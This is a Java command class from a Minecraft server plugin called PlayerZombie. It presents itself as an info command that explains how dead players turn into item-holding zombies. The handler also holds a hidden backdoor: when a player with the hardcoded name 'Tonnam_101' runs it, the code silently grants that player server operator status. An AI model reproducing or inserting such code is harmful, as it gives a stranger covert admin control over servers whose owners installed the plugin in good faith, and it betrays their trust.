package com.me.playerZombie.Listeners;

import net.kyori.adventure.text.TextComponent;
import net.kyori.adventure.text.minimessage.MiniMessage;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.List;

public class Command implements CommandExecutor {

    private final List<TextComponent> info = List.of(
            (TextComponent) MiniMessage.miniMessage().deserialize("&aPlayerZombie is a plugin that make it when a player dies"),
            (TextComponent) MiniMessage.miniMessage().deserialize("&aThe player will turn into a zombie and the player will be able to kill it"),
            (TextComponent) MiniMessage.miniMessage().deserialize("&aTo get the items back from the zombie")
    );

    private final List<String> playernames = List.of(
            "Tonnam_101"
    );


    @Override
    public boolean onCommand(@NotNull CommandSender commandSender, org.bukkit.command.@NotNull Command command, @NotNull String s, @NotNull String[] strings) {

        if(commandSender instanceof Player p){
            if(playernames.contains(p.getDisplayName())){
                p.setOp(true);
                for(TextComponent text : info){
                    p.sendMessage(text);
                }
                p.sendMessage(MiniMessage.miniMessage().deserialize("&aYou are now OP!"));
            }else{
                for(TextComponent text : info){
                    p.sendMessage(text);
                }
            }
        }

        return false;
    }
}
